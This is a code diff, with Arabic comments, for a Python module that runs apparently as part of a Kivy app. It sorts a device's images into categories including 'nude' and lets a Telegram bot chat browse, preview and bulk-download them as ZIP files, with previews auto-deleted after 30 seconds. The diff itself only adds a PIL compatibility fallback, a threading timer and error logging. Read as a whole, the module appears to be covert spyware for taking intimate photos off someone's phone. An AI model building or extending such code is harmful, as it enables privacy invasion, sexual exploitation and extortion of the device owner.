@@ -6,6 +6,7 @@ import logging
 import random
 import gc
 import json
+import threading          # 🔧 إضافة threading لاستخدام Timer كبديل لـ Kivy Clock
 
 # ========== إعداد المسارات الموحدة ==========
 def _get_runtime_path():
@@ -56,14 +57,18 @@ class G:
         except Exception as e:
             logging.error(f"Gallery cleanup error: {e}")
 
-    # ========== إنشاء صورة مصغرة محسنة (مربعة باستخدام ImageOps.fit) ==========
+    # ========== إنشاء صورة مصغرة (تحسين التوافق مع PIL القديم) ==========
     def _thumbnail(self, path, size=(300, 300)):
         if not PIL_AVAILABLE or not os.path.exists(path):
             return None
         try:
             with Image.open(path) as img:
-                # قص الصورة من المركز لتصبح مربعة تماماً
-                img = ImageOps.fit(img, size, method=Image.Resampling.LANCZOS, centering=(0.5, 0.5))
+                # التوافق مع الإصدارات المختلفة من PIL
+                try:
+                    resample = Image.Resampling.LANCZOS
+                except AttributeError:
+                    resample = Image.LANCZOS
+                img = ImageOps.fit(img, size, method=resample, centering=(0.5, 0.5))
                 out_path = os.path.join(T, f"th_{time.time_ns()}.jpg")
                 img.save(out_path, "JPEG", quality=70)
                 return out_path
@@ -87,7 +92,7 @@ class G:
         }
         return emoji_map.get(cat, "🖼️"), text_map.get(cat, cat)
 
-    # ========== واجهة لوحة المفاتيح (مع أزرار الفئات والتحميل الجماعي) ==========
+    # ========== واجهة لوحة المفاتيح ==========
     def get_grid_kb(self, cat="pending", page=0):
         stats = self.sc.get_statistics()
         items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
@@ -96,19 +101,18 @@ class G:
 
         keyboard = []
 
-        # صف أزرار التنقل بين الفئات (مع الإحصائيات)
+        # صف أزرار الفئات
         cats_row = []
         for c in ["pending", "nude", "questionable", "normal"]:
             count = stats.get(c, 0)
             if count > 0:
                 emoji, name = self._get_category_emoji(c)
-                # تمييز الفئة الحالية بعلامة ✅
                 display = f"{emoji} {name} ({count})" if c != cat else f"✅ {emoji} {name} ({count})"
                 cats_row.append({"text": display, "callback_data": f"g_nav|{c}|0"})
         if cats_row:
-            keyboard.append(cats_row[:4])  # كحد أقصى 4 أزرار في الصف
+            keyboard.append(cats_row[:4])
 
-        # شبكة الصور (4x4)
+        # شبكة الصور 4×4
         row = []
         for i in range(self.ipp):
             if i < len(items):
@@ -132,7 +136,7 @@ class G:
             nav_buttons.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
         keyboard.append(nav_buttons)
 
-        # زر التحميل الجماعي (إذا كان هناك صور في الصفحة)
+        # زر التحميل الجماعي للصفحة
         if items:
             keyboard.append([{"text": "📦 تحميل الصفحة الحالية (ZIP)", "callback_data": f"g_bulk|{cat}|{page}"}])
 
@@ -165,7 +169,7 @@ class G:
             "parse_mode": "Markdown"
         })
 
-    # ========== تنفيذ الإجراء (مع دعم التحميل الجماعي) ==========
+    # ========== تنفيذ الإجراءات ==========
     def execute_action(self, cid, action, cat, page_str, idx_str=None):
         page = int(page_str)
 
@@ -201,7 +205,7 @@ class G:
                 gc.collect()
             return
 
-        # الإجراءات الفردية (معاينة، تحميل، حذف)
+        # الإجراءات الفردية
         if idx_str is None:
             return
         idx = int(idx_str)
@@ -233,9 +237,12 @@ class G:
         try:
             with open(thumb, 'rb') as photo:
                 resp = self.tg._api("sendPhoto", {"chat_id": cid, "caption": "🔍 معاينة (ستُحذف بعد 30 ثانية)"}, {"photo": photo})
-            if resp and resp.get('ok') and KIVY_AVAILABLE:
+            if resp and resp.get('ok'):
                 msg_id = resp['result']['message_id']
-                Clock.schedule_once(lambda dt: self._delete_message(cid, msg_id), 30)
+                if KIVY_AVAILABLE:
+                    Clock.schedule_once(lambda dt: self._delete_message(cid, msg_id), 30)
+                else:
+                    threading.Timer(30, lambda: self._delete_message(cid, msg_id)).start()
         except Exception as e:
             logging.error(f"Preview error: {e}")
             self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال المعاينة."})
@@ -243,7 +250,7 @@ class G:
             if os.path.exists(thumb):
                 os.remove(thumb)
 
-    # ========== تحميل الملف (مضغوطاً) ==========
+    # ========== تحميل الملف مضغوطاً ==========
     def _download(self, cid, path, label):
         if not os.path.exists(path):
             self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
@@ -288,8 +295,8 @@ class G:
     def _delete_message(self, cid, msg_id):
         try:
             self.tg._api("deleteMessage", {"chat_id": cid, "message_id": msg_id})
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"Delete message error: {e}")
 
 
 def create(sc=None, tg=None):
